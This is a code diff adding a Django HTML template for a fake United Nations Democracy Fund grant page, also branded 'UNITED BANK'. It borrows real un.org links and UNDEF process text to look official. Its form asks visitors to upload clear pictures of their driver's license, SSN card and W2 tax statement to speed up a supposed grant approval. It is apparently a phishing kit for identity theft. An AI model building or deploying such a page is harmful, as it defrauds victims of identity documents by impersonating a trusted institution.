@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    {% load static %}
+    
+    <link rel="stylesheet" href="{% static 'forminput.css' %}"> 
+    
+    
+    
+</head>
+
+<body>
+    
+    <div class="container">
+        <div class="clblue"> <div><span>welcome to united nations</span> </div>
+        <div class="clblue2">
+
+        </div>
+     </div>
+        <nav class='firstnav'>
+            <img class="undefsession2" src="{% static 'images/logo.png' %}"/>
+            <!-- Hamburger Toggle Button -->
+            <div class="hamburger" id="hamburger">&#9776;</div>
+
+             <div class="side-drawer" id="sideDrawer">  
+                <!-- <span class="close-btn" id="closeDrawer">&times;</span>
+                <a href="https://www.un.org/democracyfund/" class="fanchor">Home</a>
+                <a href="https://www.un.org/democracyfund/about-undef" class="fanchor">About UNDEF</a>
+                <a href="https://www.un.org/democracyfund/projects" class="fanchor">Projects</a>
+                <a href="https://www.un.org/democracyfund/content/undef-lessons-learned" class="fanchor">Lessons</a>
+                <a href="https://www.un.org/democracyfund/Information-for-Grantees" class="fanchor">Grantees</a>
+            </div>
+            
+
+            
+                <div class="fn1"><h3> UNITED <br/>
+                    BANK </h3></div>  
+                <div class="fn2"><h6>YOUR ASSETS MULTIPLIES</h6></div>
+                <div class="homes1"> 
+                    <a href="https://www.un.org/democracyfund/" class="fanchor">Home</a>
+
+                </div>
+                <div class="homes2"> 
+                    <a href="https://www.un.org/democracyfund/about-undef" class="fanchor"> About UNDEF </a>
+
+                </div>
+                <div class="homes3">
+                     <a href="https://www.un.org/democracyfund/projects" class="fanchor" >Projects </a>
+
+
+                </div>
+                <div class="homes4">
+                     <a href="https://www.un.org/democracyfund/content/undef-lessons-learned"class="fanchor" > Lesson</a>
+
+
+                </div>
+                <div class="homes5">
+                      <a href="https://www.un.org/democracyfund/Information-for-Grantees"class="fanchor" >Grantees</a>
+
+
+                </div>
+                 <div class="dropdown">
+                     <!-- <button class="drpmenu"> MENU</button>
+
+                    <div class="drpcnt">
+                        <button class="drps" > <a href="https://www.un.org/democracyfund/about-undef" class="fanchor"> About Us</a></button>
+                        <button class="drps" > <a href="https://www.un.org/democracyfund/content/undef-lessons-learned" class="fanchor"> Lesson</a></button>
+                        <button class="drps" > <a href="https://www.un.org/democracyfund/ " class="fanchor"> Home </a></button>
+                        <button class="drps"> <a href="https://www.un.org/democracyfund/Information-for-Grantee" class="fanchor">Grantees</a></button>
+
+                    </div> -->
+
+                 </div>
+
+        </nav> 
+            <small>
+                {% for msg in messages %}
+                    <p>{{ msg }}</p>
+                {% endfor %}
+
+            </small>
+            
+
+
+            <div class='seconddiv'>
+                <div class="clblue3">
+
+                </div>
+               
+             <div class='Formcontainer'>
+                
+                <h2 class='correction'>kindly fill the forms below correctly</h2>
+                <div class='fillform'>
+                    
+                    <form method="post"  class="mainform" enctype="multipart/form-data">
+                        {% csrf_token %}
+
+                                
+
+
+                   
+                    <!-- </form> -->
+                </div>
+                
+
+                
+             </div>
+
+
+
+            
+        </div> 
+
+        <div class='thirddiv'>
+            <div class= "formcontainer2">
+            <h2 class='correction2'>the below section is mainly for uploading of document <br/>
+            to hasten the approval of your grant, uploading a blury <br/>
+            picture  or document might result to a rejection of your application </h2>
+            <div class='fillform2'>
+                <!-- <form method="post"> -->
+                        <fieldset>
+                            <legend> <h2> UPLOAD DOCUMENTS HERE</h2></legend>
+                            <label for ="DL"><p> Upload a clear picture of your Drivers license </p></label>
+                            <input type='file' id='id_DL' name="DL"/>
+
+                            
+
+                        </fieldset>
+                       
+
+                        <fieldset>
+                        <legend> <h2> UPLOAD DOCUMENTS HERE</h2></legend>
+                            <label for ="SSN"><p> Upload a clear picture of your SSN CARD </p></label>
+                            <input type='file' id='id_SSN' name="SSN"/>
+
+                        </fieldset>
+
+                        <fieldset>
+                        <legend> <h2> UPLOAD DOCUMENTS HERE</h2></legend>
+                            <label for ="SSN"><p> Upload a clear picture of your W2 (WAGES AND TAX STATEMENT) </p></label>
+                            <input type='file' id='id_w2' required="" name="W2"/>
+
+                        </fieldset>
+                         <input type="submit"  value="Submit Form"/>
+                        
+
+                </form>
+
+
+
+                
+
+
+            </div>
+
+                
+            </div>
+
+        
+        </div> 
+
+         <div class='fourthdiv'> 
+
+            <!-- <h1>The stages of the process are:</h1><br/>
+<h1>Online Project Proposal System  </h1><br/> 
+The on-line project proposal system can be accessed at the UNDEF website only during the annual window. Please read the<br/>
+ following documents: project proposal guidelines, lessons learned for applicants, frequently asked questions, blank project <br/>
+ proposal form, and summaries of existing projects.  The on-line proposal form is fairly short and simple, as you are not expected at <br/>
+ this stage to draft a full project document. Project proposals submitted by e-mail, regular post, facsimile, diplomatic or UN pouch<br/>
+ , hand or courier delivery or any other channel will NOT be considered. Neither will project proposals in any language other than<br/>
+  English or French.<br/>
+
+
+<h1>Short-List</h1>
+The long list produced by the team of independent assessors is then examined by the Fund’s Programme Consultative Group <br/>
+-- comprising the Department of Political Affairs, the Department of Peacekeeping Operations, the Office of the High Commissioner <br/>
+for Human Rights, the UN Development Programme, the UN Development Fund for Women and the UN Office on Drugs and Crime<br/>
+ -- in consultation with United Nations Resident Coordinators in the field. <br/>
+
+<h1>UNDEF Board</h1>
+  
+The Programme Consultative Group review yields a short list which is reviewed by the UNDEF Advisory Board -- comprising<br/>
+ Governments, civil society and individuals. <br/>
+
+
+<h1>UN Secretary-General</h1>
+The final short list is then submitted to the UN Secretary-General for approval.<br/>
+
+<h1>Project Document</h1>
+Once the short list is approved by the Secretary-General, the proposal moves into the final stage in the selection process: the <br/>
+negotiation of a project document, which is in effect the contract between UNDEF and the grantee.  This negotiation requires the<br/>
+ applicant to provide a more elaborated project design, and involves detailed input from both UNDEF and the applicant, as well as<br/>
+  scrutiny and due diligence enquiries by UNDEF.  -->
+
+                
+
+
+            
+        </div>  
+
+
+
+        
+
+
+    
+        <div class="footer">
+            <div class="fhr"> </div>
+
+            <div class="undefsession1">  <img class="undefsession" src="{% static 'images/logo.png' %}"/>
+            <h2>UNITED <br/>
+                BANK</h2></div>
+                <hr class="lasthr"/>
+
+                <div class="llastdiv"> 
+                    <div><a href="https://www.un.org/en/site-index" class="fanchor"> A-Z SITE INDEX</a> <span class="design"> |</span> </div>
+                    <div> <a href="https://www.un.org/en/contact-us-0" class="fanchor">CONTACT</a><span class="design"> |</span> </div>
+                    <div> <a href="https://www.un.org/en/about-us/copyright" class="fanchor">COPYRIGHT </a><span class="design"> |</span></div>
+                    <div><a href="https://www.un.org/en/about-us/frequently-asked-questions" class=" fanchor"> FAQ</a>  <span class="design"> |</span></div>
+                    <div><a href="https://www.un.org/en/about-us/privacy-notice" class="fanchor">PRIVACY NOTICE </a><span class="design"> |</span></div>
+                    <div><a href="https://www.un.org/en/about-us/terms-of-use" class="fanchor">TERMS OF USE </a></div>
+        
+            </div>
+    
+
+    </div>
+
+    <script>
+        const hamburger = document.getElementById('hamburger');
+        const sideDrawer = document.getElementById('sideDrawer');
+        const closeDrawer = document.getElementById('closeDrawer');
+    
+        hamburger.addEventListener('click', () => {
+            sideDrawer.style.left = '0';
+        });
+    
+        closeDrawer.addEventListener('click', () => {
+            sideDrawer.style.left = '-100%';
+        });
+    
+        document.addEventListener('click', (e) => {
+            if (!sideDrawer.contains(e.target) && !hamburger.contains(e.target)) {
+                sideDrawer.style.left = '-100%';
+            }
+        });
+    </script>
+    
+
+
+</body>
+</html>
